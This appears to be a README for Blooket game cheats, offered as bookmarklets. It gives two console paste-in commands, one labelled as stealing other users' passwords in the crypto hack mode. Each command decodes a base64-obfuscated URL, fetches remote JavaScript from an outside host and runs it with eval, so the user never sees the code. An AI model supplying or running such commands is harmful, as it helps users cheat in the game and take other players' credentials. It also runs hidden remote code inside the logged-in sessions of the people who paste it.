**Discord server: https://discord.gg/K5xUbuDqmG**

**These bookmarklets are also on: https://schoolcheats.net/blooket**

# crypto

This cheat only works in crypto hack game mode!

# getCrypto.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NyeXB0b0dldENyeXB0by5qcw==')).then((res) => res.text().then((t) => eval(t)))
```

# getOtherUsersPassword.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2NyeXB0b0hhY2tQYXNzd29yZHMuanM=')).then((res) => res.text().then((t) => eval(t)))
```
